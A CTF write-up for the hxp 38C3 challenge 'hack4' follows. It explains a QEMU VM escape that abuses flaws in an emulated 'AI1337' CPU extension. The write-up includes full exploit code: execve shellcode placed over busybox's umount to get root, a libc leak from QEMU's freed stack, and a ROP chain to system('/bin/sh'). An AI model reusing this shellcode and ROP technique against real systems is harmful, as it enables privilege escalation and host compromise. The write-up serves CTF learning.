---
title: "hxp_silicon_foundaries_hack4 - hxp 38C3 CTF"
category: "pwn"
subcategory: "rop"
type: "writeup"
tags: ["pwn", "rop", "use-after-free", "pie", "memcpy", "hxp", "silicon", "foundaries", "hack4", "hxp-38c3-ctf", "ctf-writeup"]
summary: "Tue, 31 December 2024 ~ sisu"
source:
  name: "CTFtime writeup #39759"
  url: "https://ctftime.org/writeup/39759"
original_source: "https://hxp.io/blog/120/"
ctf:
  name: "hxp 38C3 CTF"
  challenge: "hxp_silicon_foundaries_hack4"
---

## Metadata

- **CTF:** hxp 38C3 CTF
- **Task:** hxp_silicon_foundaries_hack4
- **Author team:** hxp
- **CTFtime:** <https://ctftime.org/writeup/39759>
- **Original writeup:** <https://hxp.io/blog/120/>

---
Tue, 31 December 2024 ~ sisu

## hxp 38C3 CTF: hack4

PWN (417 points, 15 solves)

This post discusses the solution for the [hxp_silicon_foundaries_hack4](https://2024.ctf.link/internal/challenge/6b7ff9d7-efc9-47fc-a06e-4ab9ae6d9eaa/) challenge.

### Challenge overview

The challenge gives one access to a QEMU VM running a modified AMD64 CPU - the _hack4_ \- with an extension for supporting “AI operations” on a dedicated “AI engine” - the _AI1337_. The goal of the challenge is to exploit bugs in the QEMU implementation for emulating the hardware to escape the QEMU VM.

For understanding the hardware architecture changes better, there’s a provided manual - _hxp_ai1337.pdf_ \- in the challenge that documents the hardware architecture.

There are at least the following flaws in the implementation:

  1. The virtual memory “scratch hole” is global for any code running on the CPU, so it breaks cross-process and kernel-userspace isolation.
  2. The virtual memory “scratch hole” occupies a contiguous virtual memory region that takes precedence during address translation, which breaks any assumptions of software about what is mapped on any given virtual memory region.
  3. The _scrhlw_ instruction is privileged but the Linux code still allows relocating the scratch hole via the PR_SET_SCRATCH_HOLE command even if user is unprivileged.
  4. The new instructions have side effects on access fault because the “access_enabled” global state is never cleaned-up.
  5. The scratch memory is allocated on the QEMU’s thread stack and freed after setup is done, which results in a use-after-free for any scratch memory operations.


The end goal of the challenge is to use the stack use-after-free (flaw 5) to create a ROP-chain on the QEMU stack to gain code execution and spawn a shell. Unfortunately, the scratch memory size is not configured to be large enough to cover the used stack frames of the QEMU thread. To achieve this, the exploit needs to increase the slice size and slize count, but this operation is done via _wrmsr_ to Model Specific Registers that is a privileged operation and the VM environment only provides a non-privileged user shell.

### How to get root?

Normally, only the AI1337 engine can make use of the virtual memory scratch hole since the “access_enabled” state is only turned on during the execution of the specialized AMD64 instructions for interacting with the AI1337 engine. However, _Flaw 4_ allows one to keep the “access_enabled” state on, which will cause any memory access, that falls into the scratch virtual memory region, to be served from scratch memory. Combining _flaws 1, 2, 3 and 4_ allows the user to relocate the scratch memory region to any virtual address and have any user process or kernel access the global memory for any memory access - instruction or data fetches.

The /init process is a suitable target because it runs as root and busybox is not built with image base randomization enabled (PIE). The below exploit overlaps the scratch hole region with the code handling the umount code, that gets executed during /init teardown, then writes shell-spawning code and finally calls exit. The exit call will return execution to the /init script that will call umount in busybox, that will then result into spawning a root shell. This is the first stage of the exploit that results into getting a root shell.

The second stage of the exploit fixes up the hole to a high address to prevent any further aliasing in the CPU virtual address space. This is necessary to avoid any unintended crashes.

The third and final stage is for exploiting QEMU’s stack frame use-after-free. The exploit first writes to MSR_HACK4_NUM_SLICES to increase the scratch buffer size, so that it overlaps with the stack frames used by the QEMU thread. The exploit then reads the scratch buffer to find libc leaks, and writes a ROP chain to call system(“/bin/sh”). The exploit has a bit more code for finding a potential libc leak instead of relying on fixed offsets, that was necessary for having the exploit work during the challenge development but is not necessary during a CTF.

Flag: `hxp{tH1s_1s_th3_AI_$$$s3Ri3$$$_n0t_tH3_s3CuR3_s3R1eS}`

### Exploit code

explain_main.c:

```
    #include <stdio.h>
    #include <stdint.h>
    #include <stdlib.h>
    #include <string.h>
    #include <fcntl.h>
    #include <unistd.h>
    #include <stdbool.h>
    #include <sys/prctl.h>
    
    void load_scratch(uint64_t slice, uint64_t slice_offset, void *source, uint64_t length);
    void read_scratch(uint64_t slice, uint64_t slice_offset, void *destination, uint64_t length);
    void write_scr_hole(uint64_t);
    
    int get_msr_fd()
    {
        static int msr = -1;
        if (msr < 0) {
            msr = open("/dev/cpu/0/msr", O_RDWR);
            if (msr < 0) {
                fprintf(stderr, "Failed to open MSR node\n");
                return 1;
            }
        } else {
            return msr;
        }
    }
    
    uint64_t rdmsr(size_t msr)
    {
        int fd = get_msr_fd();
        uint64_t val;
        if (sizeof(val) != pread(fd, &val, sizeof(val), msr)) {
            fprintf(stderr, "Failed to read msr %zx\n", msr);
            exit(1);
        }
        return val;
    }
    
    void wrmsr(size_t msr, uint64_t val)
    {
        int fd = get_msr_fd();
        if (sizeof(val) != pwrite(fd, &val, sizeof(val), msr)) {
            fprintf(stderr, "Failed to write msr %zx\n", msr);
            exit(1);
        }
    }
    
    #define PR_SET_SCRATCH_HOLE            0x53534352
    
    void first_stage() {
        uint8_t *data = calloc(1, 0x2000);
    
        printf("Create nop-sled\n");
        memset(data, 0x90, 0x1000);
    
        printf("Populate code to start a shell\n");
        char code[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
        memcpy(&data[0x1000], code, sizeof(code));
    
        printf("Finish with an endless loop for easier debugging\n");
        data[0x1000 + sizeof(code)] = 0xEBU;
        data[0x1001 + sizeof(code) + 1] = 0xFEU;
    
        printf("Load into scratch memory\n");
        for (size_t i = 0; i < 0x2000; i += 1024) {
            load_scratch(i / 1024, 0, &data[i], 1024);
        }
    
        printf("VA page that contains the 'umount' applet code\n"
        "The exact VA for the umount entrypoint is 0x005b0e65\n");
        uint64_t base = 0x005b0000UL;
    
        printf("Relocate the scrach hole to overlap 'umount'\n");
        int err = prctl(PR_SET_SCRATCH_HOLE, base, 0, 0, 0);
        if (err < 0) {
             printf("Failed to update scratch hole\n");
             return;
        }
    
        printf("Cause fault\n");
        // The fault will happen after the AI1337 transaction setting enablement has happened and will never be cleared.
        // This ensures that another process will get to read
        load_scratch(20, 0, (void *)0xFEFEFEFEFEFEUL, 64);
    }
    
    #define NEW_BASE 0xFFFFFF0000000UL
    
    void second_stage() {
        // Reset to a high address to avoid unintended crashes
        int err = prctl(PR_SET_SCRATCH_HOLE, NEW_BASE, 0, 0, 0);
        if (err < 0) {
             printf("Failed to update scratch hole\n");
             return;
        }
        printf("done second stage and cause crash\n");
        load_scratch(20, 0, (void *)0xFEFEFEFEFEFEUL, 64);
    }
    
    void third_stage() {
        // Update slice size configuration
        #define MSR_HACK4_NUM_SLICES            0xc0000106
        wrmsr(MSR_HACK4_NUM_SLICES, 68);
    
        uint8_t *buf = calloc(1, 128 * 1024);
        memset(buf, 'A', 68 * 1024);
    
        // Obtains leaks from the thread's stack
        const size_t N = 68;
        for (size_t i = 0; i < N; ++i) {
            read_scratch(i, 0, &buf[i * 1024], 1024);
        }
    
        for (size_t i = 0; i < N * 1024; i+=8) {
            printf("[%zu] = 0x%lx\n", i, ((uint64_t *)buf)[i/8]);
        }
    
        const uint64_t fragile_buf_off = 35208;
    
        const size_t libcBaseN = 256;
        uint64_t potentialLibcBases[libcBaseN + 1];
        uint64_t score[libcBaseN + 1];
        size_t libcIndex = 0;
        memset(potentialLibcBases, -1, sizeof(potentialLibcBases));
        memset(score, 0, sizeof(score));
        for (size_t i = 0; i < N * 1024; i+=8) {
            const uint64_t addr = ((uint64_t *)buf)[i/8];
            uint64_t base = 0;
            if ((addr & 0xFFFU) == 0x1beU) {
                base = addr - 0x851beUL;
            }
            if ((addr & 0xFFFU) == 0x1caU) {
                base = addr - 0x2a1caUL;
            }
            if (base) {
                bool found = false;
                for (size_t j = 0; j < libcBaseN; ++j) {
                    if (potentialLibcBases[j] == base) {
                        score[j] += 1;
                        found = true;
                        break;
                    }
                }
                if (!found && libcIndex < libcBaseN) {
                    potentialLibcBases[libcIndex] = base;
                    score[libcIndex] = 1;
                    libcIndex++;
                }
            }
        }
    
        if (libcIndex == 0) {
            printf("No libc base found\n");
            exit(1);
        }
    
        uint64_t bestScore = 0;
        uint64_t libc_base = 0;
        for (size_t i = 0; i < libcIndex; ++i) {
            if (score[i] > bestScore) {
                bestScore = score[i];
                libc_base = potentialLibcBases[i];
            }
        }
    
        const uint64_t fragile_ppoll_nibles = 0x602;
        const uint64_t fragile_binsh_offset = 0x1cb42fU;
        const uint64_t fragile_system_offset = 0x58740;
        const uint64_t fragile_pop_rdi_ret = 0x000000000010f75bU;
    
        printf("libc_base = 0x%lx\n", libc_base);
    
        ssize_t ppoll_found_index = -1;
        for (size_t i = 0; i < N * 1024; i+=8) {
            if ((((uint64_t *)buf)[i/8] & 0xFFFU) == fragile_ppoll_nibles) {
                printf("found ppoll [%zu] = 0x%lx\n", i, ((uint64_t *)buf)[i/8]);
                ppoll_found_index = i;
                break;
            }
        }
        if (ppoll_found_index == -1) {
            printf("Failed to find good return address\n");
            return;
        }
    
        #define REL(A) (libc_base + (A))
        const uint64_t rop[] = { REL(fragile_pop_rdi_ret + 1UL), REL(fragile_pop_rdi_ret), REL(fragile_binsh_offset), REL(fragile_system_offset) };
        memcpy((void *)(NEW_BASE + ppoll_found_index), rop, sizeof(rop));
    
        wrmsr(MSR_HACK4_NUM_SLICES, 16);
    }
    
    int main(int argc) {
        if (argc == 1) {
            printf("Executing first stage\n");
            first_stage();
        } else if (argc == 2) {
            printf("Executing second stage\n");
            second_stage();
        } else if (argc == 3) {
            printf("Executing third stage\n");
            third_stage();
        } else {
            printf("Unknown stage\n");
        }
        return 0;
    }
```

ai_exploit.s:

```
    global get_scratch_info
    global load_scratch
    global read_scratch
    global clear_scratch
    global add_slices
    global sub_slices
    global mul_slices
    global read_scr_hole
    global write_scr_hole
    
    %macro mts 0
    db 0x0f
    db 0x0a
    db 0x83
    %endmacro
    
    %macro stm 0
    db 0x0f
    db 0x0a
    db 0x84
    %endmacro
    
    %macro fscr 0
    db 0x0f
    db 0x0a
    db 0x85
    %endmacro
    
    %macro scradd 0
    db 0x0f
    db 0x0a
    db 0x86
    %endmacro
    
    %macro scrsub 0
    db 0x0f
    db 0x0a
    db 0x87
    %endmacro
    
    %macro scrmul 0
    db 0x0f
    db 0x0a
    db 0x88
    %endmacro
    
    %macro scrhlr 0
    db 0x0f
    db 0x0a
    db 0x8a
    %endmacro
    
    %macro scrhlw 0
    db 0x0f
    db 0x0a
    db 0x89
    %endmacro
    
    section .text
    
    get_scratch_info:
        ; Arguments passed to this function:
        ; ptr to structure containing info -> rdi
        ;    0..7: base
        ;    8..15: default size
        ;    16..19: slice size
        ;    20..21: num slices
        push rbx
        mov rax, 0x80000022
        cpuid
        mov dword [rdi], edx
        mov dword [rdi + 4], ebx
        mov qword [rdi + 8], rax
    
        push rcx
        shr rcx, 10
        mov dword [rdi + 16], ecx
        pop rcx
        and rcx, 0xFF
        mov byte [rdi + 20], cl
        pop rbx
        ret
    
    load_scratch:
        ; Arguments passed to this function:
        ; slice        -> rdi
        ; slice_offset -> rsi
        ; source       -> rdx
        ; length       -> rcx
    
        ; Move arguments to desired registers
        push rbx
        mov rbx, rdi      ; Move slice to rbx
        mov rdi, rsi      ; Move slice_offset to rdi
        mov rsi, rdx      ; Move source to rsi
        mov rcx, rcx      ; Length is already in rcx
    
        mts ; load into scratch memory
    
        pop rbx
    
        ret               ; Return to the caller
    
    read_scratch:
        ; Arguments passed to this function:
        ; slice        -> rdi
        ; slice_offset -> rsi
        ; source       -> rdx
        ; length       -> rcx
    
        ; Move arguments to desired registers
        push rbx
        mov rbx, rdi      ; Move slice to rbx
        mov rdi, rsi      ; Move slice_offset to rdi
        mov rsi, rdx      ; Move destination to rsi
        mov rcx, rcx      ; Length is already in rcx
    
        stm
    
        pop rbx
    
        ret               ; Return to the caller
    
    clear_scratch:
        fscr
        ret
    
    add_slices:
        ; Arguments passed to this function:
        ; slice A      -> rdi
        ; slice B      -> rsi
        ; slice C      -> rdx
        scradd
        ret
    
    sub_slices:
        ; Arguments passed to this function:
        ; slice A      -> rdi
        ; slice B      -> rsi
        ; slice C      -> rdx
        scrsub
        ret
    
    mul_slices:
        ; Arguments passed to this function:
        ; slice A      -> rdi
        ; slice B      -> rsi
        ; slice C      -> rdx
        scrmul
        ret
    
    read_scr_hole:
        scrhlr
        ret
    
    write_scr_hole:
        scrhlw
        ret
```

exploit.py:

```
    #!/usr/bin/env python3
    
    from pwn import *
    
    def send_file(io, filename: str, target: str):
        with open(filename, 'rb') as f:
            binary = f.read()
            binary = b64e(binary)
            progress = 0
            N = 0x200
            info("[+] sending base64ed exploit (total: {})...".format(hex(len(binary))))
            for s in [binary[i: i+N] for i in range(0, len(binary), N)]:
                io.sendlineafter(b'$', 'echo -n "{}" >> {}.b64'.format(s, target).encode()) # don't forget -n
                progress += N
                if progress % N == 0:
                    info("[.] sent {} bytes [{:.02f} %]".format(hex(progress), float(progress)*100.0/float(len(binary))))
            io.sendlineafter(b'$', 'base64 -d {}.b64 > {}'.format(target, target).encode())
            io.sendlineafter(b'$', 'chmod +x {}'.format(target).encode())
    
    def hack():
        io = remote(sys.argv[1], int(sys.argv[2]))
    
        r = io.readline().decode("ascii")
        info(f"POW: {r}")
        sol = do_pow(r)
        info(f"Solution: {sol}")
        io.sendline(sol.encode())
    
        info("Sending file")
        send_file(io, "exploit", "/home/ctf/exploit")
        info("Run first stage exploit")
        io.sendlineafter(b'$', b'/home/ctf/exploit')
        assert(b'' != io.sendlineafter(b'$', b'exit', timeout=3))
        assert(b'' != io.sendlineafter(b'#', b'id', timeout=3))
        info("Run second stage exploit")
        assert(b'' != io.sendlineafter(b'#', b'/home/ctf/exploit 2', timeout=4))
        info("Run third stage exploit")
        assert(b'' != io.sendlineafter(b'#', b'/home/ctf/exploit 2 3', timeout=4))
        info("Sleep a bit")
        time.sleep(2)
        info("Get the flag")
        io.sendline(b"cat ./flag.txt")
        flag = io.readuntil(b"}", timeout=4)
        assert(b'' != flag)
        flag = flag[flag.find(b"hxp{"):].decode("ascii")
        print(f"Flag: {flag}")
        exit(0)
    
    def do_pow(s):
        import re, subprocess, time
        m = re.search(r'please give S such that sha256\(unhex\("([0-9a-f]+)" \+ S\)\) ends with ([0-9]+) zero bits', s)
        if m is None:
            raise Exception("Failed to parse pow", f)
        prefix = m.groups()[0]
        difficulty = int(m.groups()[1])
        print(f'[starting PoW... difficulty=\x1b[35m{difficulty}\x1b[0m prefix=\x1b[35m{prefix}\x1b[0m]', file=sys.stderr)
        t0 = time.time()
        sol = subprocess.check_output(['./pow-solver', str(difficulty), prefix]).decode().strip()
        print('[PoW took \x1b[35m{}\x1b[0m seconds ~> \x1b[35m{}\x1b[0m.]'.format(time.time() - t0, sol), file=sys.stderr)
        return sol
    
    if __name__ == "__main__":
        num_tries = 16
        for i in range(num_tries):
            info(f"Attempt {i+1}/{num_tries}")
            try:
                hack()
            except Exception as e:
                info(f"Fail: {e}")
                continue
            exit(0)
    
        print("Exploit failed", file=sys.stderr)
        exit(1)
```
